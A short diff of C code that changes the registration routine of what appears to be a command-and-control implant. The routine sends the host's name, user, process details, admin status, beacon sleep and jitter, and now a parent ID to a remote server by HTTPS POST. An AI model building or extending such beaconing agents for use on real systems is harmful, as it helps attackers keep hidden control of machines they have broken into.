@@ -494,10 +494,10 @@ int agent_register(void) {
         "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"linux/amd64\","
         "\"pid\":%d,\"transport\":\"https\","
         "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\","
-        "\"is_admin\":%s,\"language\":\"c\"}",
+        "\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\"}",
         hostname, username, (int)getpid(),
         AGENT_SLEEP_SEC, AGENT_JITTER_PCT, proc_name,
-        is_root() ? "true" : "false");
+        is_root() ? "true" : "false", AGENT_PARENT_ID);
 
     uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
     if (!http_do("POST", "/register",
